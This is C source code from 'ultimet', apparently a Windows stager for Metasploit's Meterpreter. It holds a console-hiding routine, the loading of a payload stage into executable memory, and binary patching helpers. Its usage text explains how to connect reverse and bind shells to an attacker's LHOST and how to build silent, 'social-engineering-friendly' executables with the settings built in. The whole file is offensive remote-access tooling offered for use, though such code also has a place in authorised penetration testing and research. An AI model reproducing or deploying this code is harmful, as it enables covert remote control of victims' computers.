#include "main.h"
DWORD err = 0;

void Stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindow(L"ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);     
}

BOOL IsThisAValidTransport(wchar_t *transport)
{
	_wcsupr(transport);
	if(
		(wcscmp(transport,L"REVERSE_TCP") == 0)		||
		(wcscmp(transport,L"BIND_TCP") == 0)		||
		(wcscmp(transport,L"REVERSE_HTTP") == 0)	||
		(wcscmp(transport,L"REVERSE_HTTPS") == 0)	||
		(wcscmp(transport,L"REVERSE_METSVC") == 0)	||
		(wcscmp(transport,L"BIND_METSVC") == 0)
		) return true;
	return false;
}


LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its filename, returns a LONGLONG, in case you have a LARGE LARGE file :)
{
	LARGE_INTEGER fileSize = {0};
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //Get a handle on the file

	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(1);
	}

	if(!GetFileSizeEx(hfile,&fileSize)) // Get the size from the file handle
	{
		err = GetLastError();
		dprintf(L"[-] Error getting file size! GetFileSizeEx() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(1);
	}

	CloseHandle(hfile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
	return fileSize.QuadPart; //LARGE_INTEGER is a sruct, QuadPart is the filesize in a 64bit digit... which should cover all file sizes "That's for files >4GB" 
} 

DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
{
	// get file size...
	DWORD size = 0;
	size = (DWORD)SizeFromName(szFileName);
	if (size == -1)
	{
		dprintf(L"[-] Something went wrong getting size of file: \"%s\".\n", szFileName);
		exit(1);
	}
	else {
		dprintf(L"[*] Size of \"%s\" is \"%d\" bytes.\n", szFileName, size);
	}

	// Allocate memory ...
	dprintf(L"[*] Trying to VirtualAlloc \"%d\" bytes of data\n", size);
	*buffer = (unsigned char*)VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
	{
		err = GetLastError();
		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", err);
		return -1;
	}
	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", size);

	// Reading file content into buffer.
	//... first we get a handle on the file
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		exit(1);
	}

	dprintf(L"[*] Copying file \"%s\" to buffer...\n", szFileName);
	if( FALSE == ReadFile(hfile, *buffer, (DWORD)size, NULL, NULL) )
	{
		printf("[-] Unable to read from file.\n");
		CloseHandle(hfile);
		exit(1);
	}
	// We add 5 bytes to leave room for 0xBF+SOCKET_NUMBER
	return (DWORD)size; 
}

int PatchString(unsigned char* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
{
	int counter = 0;
	for(int i = index; i < (index + NoOfBytes); i++)
	{
		buffer[i] = (u_char)replacement[counter];
		counter++;
	}
	return 0;
}

DWORD binstrstr(unsigned char * buff1, int lenbuff1, unsigned char * buff2, int lenbuff2)  // shamelessly ripped from http://forums.devshed.com/c-programming-42/binary-strstr-395935.html , thanks "AlejandroVarela"
{ 
	if (! buff1)                return FALSE; 
	if (! buff2)                return FALSE; 
	if (lenbuff1 == 0)            return FALSE; 
	if (lenbuff2 == 0)            return FALSE; 
	if (lenbuff1 < lenbuff2)            return FALSE; 

	for (int i = 0; i <= (lenbuff1 - lenbuff2); ++ i) 
	{
		if (memcmp(buff1 + i, buff2, lenbuff2-1) == 0)
		{
			return i; 
		}
	}

	return FALSE; 
}  

bool AnsiToUnicode(const char* ascii, wchar_t* unicode)
{
	size_t len = strlen(ascii);
	if(len < 1024)
	{
		int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
		return TRUE;
	}
	else return FALSE;
}

bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
{
	int result = WideCharToMultiByte(CP_OEMCP, 0, unicode, -1, ascii, 17, 0, 0);
	//int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
	return TRUE;
}

void print_header()
{
	printf("****************************************************\n");
	printf("[+] [ultimet] - The Ultimate Meterpreter Executable\n");
	printf("[+] v0.3 - #25Jan Revolution  \n");
	printf("****************************************************\n");
	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
}

void usage()
{
	printf(
		"Usage:\n"
		"utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] [--msfpayload]\n"
		"                                                 [--remove-stage] [--reset] \n"

		"\nConnection settings:\n"
		"\t-h\tLHOST\tIP or a hostname.\n"
		"\t-p\tLPORT\tPort number.\"\n"
		"\t-t\tTRANSPORT \"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\",\n\t\t\t  \"bind_tcp\" or \"bind_metsvc\"\n"

		"\nHTTP(S) Specific settings `optional`:\n"
		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
		"\t-et\tSECONDS\t Session expiration timeout in seconds.\n"
		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n"

		"\nCreating social-engineering-friendly exe files with `built-in` settings \"i.e. msfpayload-like exe\":\n"
		"\t--msfpayload\tWhen this is specified along with the connection parameters, a new exe will be\n"
		"\t\t\tcreated with the following naming convention: TRANSPORT-LHOST-LPORT.exe, \n"
		"\t\t\tthis newly created exe will execute silently according to the predefined settings.\n"
		"\t\t\t ... it's gonna be just like the exe files you get out of msfpayload.\n"
		"\t--reset\t\tA new exe will be created `ultimet_reset.exe` with pre-defined\n"
		"\t        \tsettings cleared `anti --msfpayload`.\n"
		
		"\nStage options:\n"
		"\t-f\tFILE\tForces loading the stage from a file.\n"
		"\t\t\tNote: The file can be a regular metsrv.dll,\n"
		"\t\t\tor an encrypted one using the ultimet_xor.exe utility.\n"
		"\t--remove-stage\tCreates a new exe `ultimet_no_stage.exe` with stage resource removed,\n"
		"\t\t\tit will resut in smaller file, but metsvc family of payloads won't be available.\n"
		"\t\t\tTo re-attach the resource ... use a resource editor.\n"

		"\nGeneral notes:\n"
		" - If you find the console window disappears immediatly when you run ultimet, this\n"
		"   means it found valid connection settings built-in, to get rid of this behaviour,\n"
		"   run `ultimet.exe --reset` and you'll get a new pristine `ultimet_reset.exe`.\n"
		" - The exe file created with `--msfpayload` option is a fully functional ultimet.exe,\n"
		"   but it will run hidden and doesn't require connection parameters to be specified since\n"
		"   they're preconfigured, to reset that exe to its norm, just specify `--reset` and a fresh\n"
		"   exe will be created with default settings.\n"
		" - If you're on a shell [not a console], you have to start the program using:\n"
		"   \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
		" - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
		"   upfront, either through the bundled resource or loaded usng the \"-f\" option\n"
		" - The most reliable handler for reverse_metsvc is:\n"
		"   \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
		"   but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp.\n"
		" - Same applies to bind_metsvc:\n"
		"  \"windows/metsvc_bind_tcp\" ... using bind_metsvc to connect to a \"bind_tcp\" *might* work,\n"
		"   but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"

		"\nAdvanced notes:\n"
		" - ultimet utilizes resources to include the stage, and to store connection settings internally.\n"
		" - The stage `metsvc.dll` is stored in a resource `BINARY` and ID `101`,\n"
		"   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe utility.\n"
		" - Options are stored in a resource `BINARY` and ID `103` using the following convention:\n"
		"   |UM|TRANSPORT|LHOST|LPORT|\n"
		" - You can use your favourite resource editor to create/edit those resources as you please.\n"

		"\nContributors:\n"
		" - Anwar Mohamed \"@anwarelmakrahy\" - Added support for metsvc_bind_tcp & bind_tcp.\n"

		);
}
